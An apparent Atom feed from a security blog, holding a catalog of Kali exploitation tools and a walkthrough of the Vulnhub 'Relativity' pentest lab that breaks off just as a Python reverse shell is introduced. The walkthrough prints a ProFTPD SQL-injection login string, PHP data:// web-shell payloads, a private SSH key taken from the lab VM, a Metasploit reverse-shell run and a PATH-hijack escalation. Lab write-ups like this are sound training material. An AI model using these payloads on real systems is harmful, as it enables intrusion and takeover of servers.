<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: security | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/security/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2015-12-20T07:44:04-05:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Kali tools catalog - Exploitation Tools]]></title>
    <link href="http://chousensha.github.io/blog/2015/06/01/kali-tools-catalog-exploitation-tools/"/>
    <updated>2015-06-01T10:56:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/06/01/kali-tools-catalog-exploitation-tools</id>
    <content type="html"><![CDATA[<h3>BeEF XSS Framework</h3>

<p><strong>beef</strong></p>

<p>BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.</p>

<p>Amid growing concerns about web-borne attacks against clients, including mobile clients, BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors. Unlike other security frameworks, BeEF looks past the hardened network perimeter and client system, and examines exploitability within the context of the one open door: the web browser. BeEF will hook one or more web browsers and use them as beachheads for launching directed command modules and further attacks against the system from within the browser context.</p>

<!-- more -->


<p><img class="center" src="/images/kali/exploit/beef.png" title="&lsquo;beef&rsquo; &lsquo;beef&rsquo;" ></p>

<h3>Exploit Database</h3>

<p><strong>searchsploit</strong></p>

<p>Exploit Database Archive Search</p>

<p>``` plain
Usage: searchsploit [options] term1 [term2] &hellip; [termN]
Example: searchsploit oracle windows local</p>

<p>=========</p>

<h1> Options </h1>

<p>   -c            Perform case-sensitive searches; by default, searches will</p>

<pre><code>             try to be greedy
</code></pre>

<p>   -h, &mdash;help    Show help screen
   -v            By setting verbose output, description lines are allowed to</p>

<pre><code>             overflow their columns
</code></pre>

<p>=======</p>

<h1> NOTES </h1>

<ul>
<li>Use any number of search terms you would like (minimum: 1)</li>
<li>Search terms are not case sensitive, and order is irrelevant
```</li>
</ul>


<h3>Exploit Development Tools</h3>

<p><strong>edb-debugger</strong></p>

<p>A Linux equivalent of the famous Olly debugger on the Windows platform. Some of its features are:</p>

<ul>
<li><p>Intuitive GUI interface</p></li>
<li><p>The usual debugging operations (step-into/step-over/run/break)</p></li>
<li><p>Conditional breakpoints</p></li>
<li><p>Debugging core is implemented as a plugin so people can have drop in replacements. Of course if a given platform has several debugging APIs available, then you may have a plugin that implements any of them.</p></li>
<li><p>Basic instruction analysis</p></li>
<li><p>View/Dump memory regions</p></li>
<li><p>Effective address inspection</p></li>
<li><p>The data dump view is tabbed, allowing you to have several views of memory open at the same time and quickly switch between them.</p></li>
<li><p>Importing and generation of symbol maps</p></li>
<li><p>Plugins</p></li>
</ul>


<p><img class="center" src="/images/kali/exploit/edb.png" title="&lsquo;edb-debugger&rsquo; &lsquo;edb&rsquo;" ></p>

<p><strong>NASM shell</strong></p>

<p>This tool provides an easy way to see what opcodes are associated with
certain x86 instructions by making use of nasm if it is installed and
reachable through the PATH environment variable.</p>

<p><strong>ollydbg</strong></p>

<p>OllyDbg is a 32-bit assembler level analysing debugger for Microsoft Windows. Emphasis on binary code analysis makes it particularly useful in cases where source is unavailable.</p>

<p>Features:</p>

<ul>
<li><p>Intuitive user interface, no cryptical commands</p></li>
<li><p>Code analysis – traces registers, recognizes procedures, loops, API calls, switches, tables, constants and strings</p></li>
<li><p>Directly loads and debugs DLLs</p></li>
<li><p>Object file scanning – locates routines from object files and libraries</p></li>
<li><p>Allows for user-defined labels, comments and function descriptions</p></li>
<li><p>Understands debugging information in Borland® format</p></li>
<li><p>Saves patches between sessions, writes them back to executable file and updates fixups</p></li>
<li><p>Open architecture – many third-party plugins are available</p></li>
<li><p>No installation – no trash in registry or system directories</p></li>
<li><p>Debugs multithread applications</p></li>
<li><p>Attaches to running programs</p></li>
<li><p>Configurable disassembler, supports both MASM and IDEAL formats</p></li>
<li><p>MMX, 3DNow! and SSE data types and instructions, including Athlon extensions</p></li>
<li><p>Full UNICODE support</p></li>
<li><p>Dynamically recognizes ASCII and UNICODE strings – also in Delphi format!</p></li>
<li><p>Recognizes complex code constructs, like call to jump to procedure</p></li>
<li><p>Decodes calls to more than 1900 standard API and 400 C functions</p></li>
<li><p>Gives context-sensitive help on API functions from external help file</p></li>
<li><p>Sets conditional, logging, memory and hardware breakpoints</p></li>
<li><p>Traces program execution, logs arguments of known functions</p></li>
<li><p>Shows fixups</p></li>
<li><p>Dynamically traces stack frames</p></li>
<li><p>Searches for imprecise commands and masked binary sequences</p></li>
<li><p>Searches whole allocated memory</p></li>
<li><p>Finds references to constant or address range</p></li>
<li><p>Examines and modifies memory, sets breakpoints and pauses program on-the-fly</p></li>
<li><p>Assembles commands into the shortest binary form</p></li>
<li><p>Starts from the floppy disk</p></li>
</ul>


<p><img class="center" src="/images/kali/exploit/ollydbg.png" title="&lsquo;ollydbg&rsquo; &lsquo;ollydbg&rsquo;" ></p>

<p><strong>pattern create</strong></p>

<p>Generate a string composed of unique patterns</p>

<p><code>plain
root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 25
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7A
</code></p>

<p><strong>pattern offset</strong></p>

<p>Find the offset in an exploit string where your address to overwrite EIP should be</p>

<p><code>plain
Usage: pattern_offset.rb &lt;search item&gt; &lt;length of buffer&gt;
Default length of buffer if none is inserted: 8192
This buffer is generated by pattern_create() in the Rex library automatically
</code></p>

<h3>Metasploit</h3>

<p>World&rsquo;s most used penetration testing software&hellip;the hacker&rsquo;s best friend. No further description needed</p>

<p>``` plain
root@kali:~# msfconsole
[*] Starting the Metasploit Framework console&hellip;|
Call trans opt: received. 2-19-98 13:24:18 REC:Loc</p>

<pre><code> Trace program: running

       wake up, Neo...
    the matrix has you
  follow the white rabbit.

      knock, knock, Neo.

                    (`.         ,-,
                    ` `.    ,;' /
                     `.  ,'/ .'
                      `. X /.'
            .-;--''--.._` ` (
          .'            /   `
         ,           ` '   Q '
         ,         ,   `._    \
      ,.|         '     `-.;_'
      :  . `  ;    `  ` --,.._;
       ' `    ,   )   .'
          `._ ,  '   /_
             ; ,''-,;' ``-
              ``-..__``--`

                         http://metasploit.pro
</code></pre>

<p>Validate lots of vulnerabilities to demonstrate exposure
with Metasploit Pro &mdash; Learn more on <a href="http://rapid7.com/metasploit">http://rapid7.com/metasploit</a></p>

<pre><code>   =[ metasploit v4.11.0-2015013101 [core:4.11.0.pre.2015013101 api:1.0.0]]
</code></pre>

<ul>
<li>&mdash; &mdash;=[ 1399 exploits &ndash; 788 auxiliary &ndash; 224 post        ]</li>
<li>&mdash; &mdash;=[ 356 payloads &ndash; 37 encoders &ndash; 8 nops             ]</li>
<li>&mdash; &mdash;=[ Free Metasploit Pro trial: <a href="http://r-7.co/trymsp">http://r-7.co/trymsp</a> ]</li>
</ul>


<p>msf >
```</p>

<h3>Network Exploitation</h3>

<p><strong>armitage</strong></p>

<p>Armitage is a scriptable red team collaboration tool for Metasploit that visualizes targets, recommends exploits, and exposes the advanced post-exploitation features in the framework.</p>

<p>Through one Metasploit instance, your team will:</p>

<ul>
<li><p>Use the same sessions</p></li>
<li><p>Share hosts, captured data, and downloaded files</p></li>
<li><p>Communicate through a shared event log.</p></li>
<li><p>Run bots to automate red team tasks.</p></li>
</ul>


<p>Armitage organizes Metasploit&rsquo;s capabilities around the hacking process. There are features for discovery, access, post-exploitation, and maneuver.</p>

<p><img class="center" src="/images/kali/exploit/armitage.png" title="&lsquo;armitage&rsquo; &lsquo;armitage&rsquo;" ></p>

<p><strong>exploit6</strong></p>

<p>Performs exploits of various CVE known IPv6 vulnerabilities on the destination</p>

<p>``` plain
exploit6 v2.5 &copy; 2013 by van Hauser / THC <a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#118;&#x68;&#64;&#x74;&#x68;&#99;&#46;&#111;&#x72;&#x67;">&#x76;&#x68;&#64;&#x74;&#104;&#x63;&#x2e;&#x6f;&#x72;&#103;</a> www.thc.org</p>

<p>Syntax: exploit6 interface destination [test-case-number]</p>

<p>Performs exploits of various CVE known IPv6 vulnerabilities on the destination
Note that for exploitable overflows only &lsquo;AAA&hellip;&rsquo; strings are used.
If a system is vulnerable, it will crash, so be careful!
```</p>

<p><strong>ikat</strong></p>

<p>iKAT is designed to provide access to the underlying operating system of a Kiosk terminal by invoking native OS functionality.</p>

<p><strong>jboss-autopwn</strong></p>

<p>This JBoss script deploys a JSP shell on the target JBoss AS server. Once deployed, the script uses its upload and command execution capability to provide an interactive session.</p>

<p>Features include:</p>

<ul>
<li><p>Multiplatform support – tested on Windows, Linux and Mac targets</p></li>
<li><p>Support for bind and reverse bind shells</p></li>
<li><p>Meterpreter shells and VNC support for Windows targets</p></li>
</ul>


<p><a href="https://github.com/SpiderLabs/jboss-autopwn">Example from the homepage</a>:</p>

<p>``` plain
Linux bind shell:</p>

<p>[root@nitrogen jboss]# ./e.sh 192.168.1.2 8080 2>/dev/null
[x] Retrieving cookie
[x] Now creating BSH script&hellip;
[x] .war file created successfully in /tmp
[x] Now deploying .war file:
<a href="http://192.168.1.2:8080/browser/browser/browser.jsp">http://192.168.1.2:8080/browser/browser/browser.jsp</a>
[x] Running as user&hellip;:
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[x] Server uname&hellip;:
 Linux nitrogen 2.6.29.6-213.fc11.x86_64 #1 SMP Tue Jul 7 21:02:57 EDT 2009 x86_64 x86_64 x86_64 GNU/Linux
[!] Would you like to upload a reverse or a bind shell? bind
[!] On which port would you like the bindshell to listen on? 31337
[x] Uploading bind shell payload..
[x] Verifying if upload was successful&hellip;
-rwxrwxrwx 1 root root 172 2009-11-22 19:48 /tmp/payload
[x] You should have a bind shell on 192.168.1.2:31337..
[x] Dropping you into a shell&hellip;
Connection to 192.168.1.2 31337 port [tcp/*] succeeded!
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
[root@nitrogen /]# full interactive shell :&ndash;)
```</p>

<p><strong>termineter</strong></p>

<p>Termineter is a framework written in python to provide a platform for the security testing of smart meters. It implements the C12.18 and C12.19 protocols for communication. Currently supported are Meters using C12.19 with 7-bit character sets. Termineter communicates with Smart Meters via a connection using an ANSI type-2 optical probe with a serial interface.</p>

<p>``` plain
root@kali:~# termineter</p>

<hr />

<p>  /<em>  <strong>/</strong> </em><strong><strong><em> _  (</em>)</strong>  </strong><em> / /</em><em><strong> </strong>__
   / / / &ndash;</em>) <strong>/  &lsquo; \/ / _ \/ &ndash;_) </strong>/ &ndash;<em>) __/
  /</em>/  _<em>/</em>/ /<em>/</em>/<em>/</em>/<em>//</em>/_<em>/_</em>/_<em>/</em>/</p>

<p>  &lt;[ termineter                     v0.1.0
  &lt;[ model:                          T-800
  &lt;[ loaded modules:                    12</p>

<p>termineter > show modules</p>

<h1>Modules</h1>

<p>  Name               Description</p>

<hr />

<p>  brute_force_login  Brute Force Credentials
  dump_tables        Dump Readable C12.19 Tables From The Device To A CSV File
  enum_tables        Enumerate Readable C12.19 Tables From The Device
  get_info           Get Basic Meter Information By Reading Tables
  get_log_info       Get Information About The Meter&rsquo;s Logs
  get_modem_info     Get Information About The Integrated Modem
  get_security_info  Get Information About The Meter&rsquo;s Access Control
  read_table         Read Data From A C12.19 Table
  run_procedure      Initiate A Custom Procedure
  set_meter_id       Set The Meter&rsquo;s I.D.
  set_meter_mode     Change the Meter&rsquo;s Operating Mode
  write_table        Write Data To A C12.19 Table</p>

<p>termineter >
```</p>

<h3>Social Engineering Toolkit</h3>

<p>The Social-Engineer Toolkit is an open-source penetration testing framework designed for Social-Engineering. SET has a number of custom attack vectors that allow you to make a believable attack in a fraction of the time.</p>

<p>``` plain</p>

<pre><code>      _______________________________
     /   _____/\_   _____/\__    ___/
     \_____  \  |    __)_   |    |
     /        \ |        \  |    |
    /_______  //_______  /  |____|
            \/         \/            
</code></pre>

<p>[&mdash;&ndash;]        The Social-Engineer Toolkit (SET)         [&mdash;&ndash;]
[&mdash;&ndash;]        Created by: David Kennedy (ReL1K)         [&mdash;&ndash;]
[&mdash;&ndash;]                  Version: 6.3                    [&mdash;&ndash;]
[&mdash;&ndash;]              Codename: &lsquo;#HugLife&rsquo;                [&mdash;&ndash;]
[&mdash;&ndash;]        Follow us on Twitter: @TrustedSec         [&mdash;&ndash;]
[&mdash;&ndash;]        Follow me on Twitter: @HackingDave        [&mdash;&ndash;]
[&mdash;&ndash;]       Homepage: <a href="https://www.trustedsec.com">https://www.trustedsec.com</a>       [&mdash;&ndash;]</p>

<pre><code>    Welcome to the Social-Engineer Toolkit (SET). 
     The one stop shop for all of your SE needs.

 Join us on irc.freenode.net in channel #setoolkit
</code></pre>

<p>   The Social-Engineer Toolkit is a product of TrustedSec.</p>

<pre><code>         Visit: https://www.trustedsec.com
</code></pre>

<p> Select from the menu:</p>

<p>   1) Social-Engineering Attacks
   2) Fast-Track Penetration Testing
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About</p>

<p>  99) Exit the Social-Engineer Toolkit</p>

<p>set>
```</p>

<p><img class="center" src="/images/kali/exploit/cookie.png" title="&lsquo;cookie&rsquo; &lsquo;cookie&rsquo;" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Relativity]]></title>
    <link href="http://chousensha.github.io/blog/2015/05/10/pentest-lab-relativity/"/>
    <updated>2015-05-10T09:40:50-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/05/10/pentest-lab-relativity</id>
    <content type="html"><![CDATA[<p>I selected the Relativity VM from Vulnhub as my next home lab target. The objective is to read <code>/root/flag.txt</code>. Let&rsquo;s get started!</p>

<!-- more -->


<p>``` plain
 nmap -A -p1-65535 192.168.80.128</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-05-10 16:46 EEST
Nmap scan report for 192.168.80.128
Host is up (0.00058s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp
22/tcp open  ssh     OpenSSH 5.9 (protocol 2.0)
| ssh-hostkey:
|   1024 42:d0:50:45:6c:4f:6a:25:d9:5e:d4:7d:12:26:04:ef (DSA)
|<em>  2048 1b:e9:72:2b:8a:0b:57:0a:4b:ad:3d:06:62:94:29:02 (RSA)
80/tcp open  http    Apache httpd 2.2.23 ((Fedora))
|</em>http-title: M.C. Escher &ndash; Relativity
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
SF-Port21-TCP:V=6.47%I=7%D=5/10%Time=554F618E%P=x86_64-unknown-linux-gnu%r
SF:(GenericLines,29,&ldquo;220\x20Welcome\x20to\x20Relativity\x20FTP\x20(mod_sq
SF:l)\r\n&rdquo;);
MAC Address: 00:0C:29:9F:1D:0E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 &ndash; 3.10
Network Distance: 1 hop
Service Info: Host: Relativity
```</p>

<p>The web server doesn&rsquo;t seem to serve anything else than an image. I ran Nikto and Dirbuster on it but didn&rsquo;t find anything. Next I hit the FTP server. No anonymous login possible, but there was something interesting in the banner:</p>

<p><code>plain
220 Welcome to Relativity FTP (mod_sql)
</code></p>

<p>I started googling, and it turns out that <a href="http://www.proftpd.org/docs/contrib/mod_sql.html">&ldquo;The mod_sql module is an authentication and logging module for ProFTPD&rdquo;</a>. The good news is, <a href="https://www.rapid7.com/db/vulnerabilities/ftp-proftpd-sql-injection">there is a SQLi vulnerability</a> in the USER command that might allow access to the server. I don&rsquo;t know the version of our target server, but let&rsquo;s try it!</p>

<p>On <a href="http://www.securityfocus.com/bid/33722/exploit">http://www.securityfocus.com/bid/33722/exploit</a> you can find some sample exploit strings:</p>

<p>``` plain
username: %&lsquo;) and 1=2 union select 1,1,uid,gid,homedir,shell from users; &mdash;
password: 1</p>

<p>username: %&lsquo;) and 1=2 union (select &lt;name&gt;,1,&lt;uid&gt;,&lt;gid&gt;,0x2F,0x2F62696E2F62617368); &mdash; a
```</p>

<p>Neither worked, but I tinkered with the comment characters and found out that I could get in either by replacing the <em>&mdash;</em> with a <em>#</em>, or by inserting a space and random characters after the <em>&mdash;</em>:</p>

<p><code>plain
220 Welcome to Relativity FTP (mod_sql)
Name (192.168.80.128:root): username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; #
331 Password required for username:.
Password:
230 User username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
</code></p>

<p>Next, I found out an interesting looking directory:</p>

<p><code>plain
ftp&gt; pwd
257 "/" is current directory.
ftp&gt; dir
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
-rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
-rw-r--r--   1 root     root          130 Mar  5  2013 index.html
226 Transfer complete.
</code></p>

<p>It seems we are in the root directory, but the html and image file hint at the web server. So I went to the website again and this time I tried to navigate to that new directory:</p>

<p><img class="center" src="/images/pentest/relativity/secretdir.png" title="&lsquo;secretdir&rsquo; &lsquo;secretdir&rsquo;" ></p>

<p>I looked around at the pages, noticed the URL when accessing them looks something like this: <code><a href="http://192.168.80.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php">http://192.168.80.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php</a></code>. So I tried some local file inclusion, but it didn&rsquo;t get me anywhere. To get to the next step, I needed some external reading and inspiration. For the exploit, we can leverage PHP&rsquo;s <a href="http://php.net/manual/en/wrappers.php">stream wrappers</a>: PHP comes with many built-in wrappers for various URL-style protocols for use with the filesystem functions such as fopen(), copy(), file_exists() and filesize(). On <a href="https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/">this blog post</a> there is a nice explanation and examples of how to get remote code execution by leveraging the <a href="http://php.net/manual/en/wrappers.data.php">data stream</a>. If you look at the examples, you can see that the content passed as a base64 string is being interpreted.
Check page 9 of <a href="https://www.imperva.com/docs/HII_Remote_and_Local_File_Inclusion_Vulnerabilities.pdf">this pdf</a> for a summary of this remote file inclusion technique. Bottom line: we can base64 encode PHP commands and feed them to the target. So to test this out:</p>

<p>``` plain</p>

<h1>simple RFI</h1>

<p>page=data://text/plain, &lt;?php system(&ldquo;whoami&rdquo;);?></p>

<h1>base64 encoded RFI</h1>

<p>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTs/Pg==</p>

<h1>mini shell</h1>

<p>page=data://text/plain,&lt;?php system($_GET[cmd]);?>&amp;cmd=id</p>

<h1>base64 + URL encoded mini shell (didn&rsquo;t work without URL encoding)</h1>

<p>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B&amp;cmd=id
```</p>

<p>And we are free to enumerate! Next thing I did was to read <em>/etc/passwd</em> (look at it in the source code of the page for better readability). This gave me the name of 2 users on the machine:</p>

<h2>``` plain</h2>

<p>mauk:x:1001:1001::/home/mauk:/bin/bash
jetta:x:1002:1002::/home/jetta:/bin/bash
```</p>

<p>Next I looked around some more, and when listing the home directories, I noticed that mauk&rsquo;s home folder permissions aren&rsquo;t what they should be (but good for us!):</p>

<p><code>plain
drwx------. 3 jetta jetta 4096 Jul  9  2013 jetta
drwxr-xr-x. 3 mauk  mauk  4096 Jul  9  2013 mauk
</code></p>

<p>Looking in mauk&rsquo;s directory, this is interesting:</p>

<p><code>
drwxr-xr-x. 2 mauk mauk 4096 Jul  9  2013 .ssh
</code></p>

<p>Even better, inside there is mauk&rsquo;s private SSH key!</p>

<p>``` plain
-rw-r&mdash;r&mdash;. 1 mauk mauk 1679 Feb 24  2013 id_rsa</p>

<p>```</p>

<p>And we can read it:</p>

<p><code>plain
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
+Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
-----END RSA PRIVATE KEY-----
</code></p>

<p>We can save this private key on our machine and use it to log in as mauk! After looking around without any major discoveries, I noticed this folder in <em>/opt/</em>:</p>

<p><code>plain
[mauk@Relativity ~]$ ls -l /opt
total 4
drwx------ 13 jetta jetta 4096 May 20 18:32 Unreal
</code></p>

<p>That means there is an Unreal IRCd server there! But I didn&rsquo;t find one when port scanning. Looking at the listening programs, there is indeed an IRC server listening on localhost on port 6667:</p>

<p><code>plain
[mauk@Relativity ~]$ netstat -lntp
(No info could be read for "-p": geteuid()=1001 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      -                   
...
</code></p>

<p>The ircd server might be an avenue for privilege escalation to jetta:</p>

<p><code>plain
[mauk@Relativity ~]$ ps -u jetta
  PID TTY          TIME CMD
  557 ?        00:00:00 ircd
</code></p>

<p>But there was no netcat installed on the machine, so to find some information about the irc server, I set up SSH port forwarding so I can access it from my machine:</p>

<p><code>plain
root@kali:~# ssh -L 4444:127.0.0.1:6667 mauk@192.168.80.128
Last login: Sat May 23 18:25:04 2015 from 192.168.80.130
[mauk@Relativity ~]$
</code></p>

<p>And now I could port scan my local 4444 port to learn more:</p>

<p>``` plain
root@kali:~# nmap -A -sV 127.0.0.1 4444</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-05-23 16:31 EEST
setup_target: failed to determine route to 4444 (0.0.17.92)
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000065s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
4444/tcp open  irc     Unreal ircd
| irc-info:
|   server: relativity.localdomain
|   version: Unreal3.2.8.1. relativity.localdomain
|   servers: 1
|   users: 1
|   lservers: 0
|   lusers: 1
|   uptime: 0 days, 0:51:08
|   source host: rox-D2735CD4
|_  source ident: nmap
```</p>

<p>I googled the version and it contains a backdoor, and there is a Metasploit module for it. I fired up Metasploit and used against my localhost and port (remember the port forwarding), and got a shell as jetta! But if you want to know more about the backdoor and how to exploit it manually, read <a href="http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">this</a>.</p>

<p>``` plain
msf exploit(unreal_ircd_3281_backdoor) > run</p>

<p>[<em>] Started reverse handler on 192.168.80.130:5555
[</em>] Connected to 127.0.0.1:4444&hellip;</p>

<pre><code>:relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
</code></pre>

<p>[<em>] Sending backdoor command&hellip;
[</em>] Command shell session 1 opened (192.168.80.130:5555 &ndash;> 192.168.80.128:41061) at 2015-05-23 17:18:12 +0300</p>

<p>whoami
jetta
```</p>

<p>In jetta&rsquo;s home directory there is a directory named <code>auth_server</code> with a binary inside. I ran <em>strings</em> on it:</p>

<p><code>plain
strings /home/jetta/auth_server/auth_server
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
fflush
puts
putchar
printf
poll
stdout
system
__libc_start_main
GLIBC_2.2.5
l$ L
t$(L
|$0H
[+] Checking Certificates...
done
[+] Contacting server, please wait...
could not establish connection
invalid certificates
error: (12)
fortune -s | /usr/bin/cowsay
Starting Auth server..
;*3$"
</code></p>

<p>Interesting. This binary also appears to be owned as root:</p>

<p><code>plain
ls -l /home/jetta/auth_server/auth_server
-rwxr-xr-x 1 root root 8010 Mar  8  2013 /home/jetta/auth_server/auth_server
</code></p>

<p>I tried to <em>sudo -l</em> to see if jetta can run any commands as root, but there was no output in my shell. So I checked if the shell I have is interactive using <a href="http://unix.stackexchange.com/questions/26676/how-to-check-if-a-shell-is-login-interactive-batch">this SO post</a>:</p>

<p><code>plain
[[ $- == *i* ]] &amp;&amp; echo 'Interactive' || echo 'Not interactive'
Not interactive
</code></p>

<p>I then read <a href="http://netsec.ws/?p=337">this post</a> about spawning a TTY shell and used the first of the choices for a proper shell:</p>

<p>``` plain
python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
sh-4.2$ sudo -l
sudo -l
Matching Defaults entries for jetta on this host:</p>

<pre><code>requiretty, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
XAUTHORITY PATH", env_reset
</code></pre>

<p>User jetta may run the following commands on this host:</p>

<pre><code>(root) NOPASSWD: /home/jetta/auth_server/auth_server
</code></pre>

<p>```</p>

<p>Excellent, so the key to getting root is in exploiting that binary we found earlier. I ran it to see what it does:</p>

<p>``` plain
sh-4.2$ /home/jetta/auth_server/auth_server
/home/jetta/auth_server/auth_server
[+] Checking Certificates&hellip;done
[+] Contacting server, please wait&hellip;could not establish connection
error: (12)</p>

<hr />

<p>&lt; There isn&rsquo;t any problem ></p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>

<p>I ran it several times for fun, made a mental note to replace my fortune cookies at the end of the blog posts with cowsay fortune cookies because this is purely awesome, then looked at <em>strings</em> again. Looking at the line <code>fortune -s | /usr/bin/cowsay</code>, we see that the <em>fortune</em> command doesn&rsquo;t use an absolute path. So we can create a program of our choosing called fortune and modify our PATH variable to start looking in the location of our program. At this point I tried several ways to get a local or reverse root shell but I kept getting errors that the fortune file is busy, so instead of running the exploit every time and then getting a TTY shell on top of it, I thought maybe I can log in directly as jetta now and work from there. So I made a <code>.ssh</code> directory inside jetta&rsquo;s home folder and copied there mauk&rsquo;s <code>authorized_keys</code> file (remember the permissions were too lax). So now I could directly ssh as jetta and try again for the shell.</p>

<p>This time I used a <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Python reverse shell</a>:</p>

<p><code>plain
